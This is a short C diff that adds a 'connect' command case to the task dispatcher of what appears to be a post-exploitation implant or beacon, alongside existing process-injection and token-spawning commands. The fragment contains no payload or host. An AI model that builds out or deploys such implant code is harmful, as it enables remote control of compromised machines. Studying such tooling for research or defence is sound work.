@@ -154,6 +154,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_INJECTX64_PING:
 			SpawnAndPing(buffer, size, FALSE);
 			break;
+		case COMMAND_CONNECT:
+			ChannelConnect(buffer, size);
+			break;
 		case COMMAND_SPAWN_TOKEN_X86:
 			Spawn(buffer, size, TRUE, FALSE);
 			break;
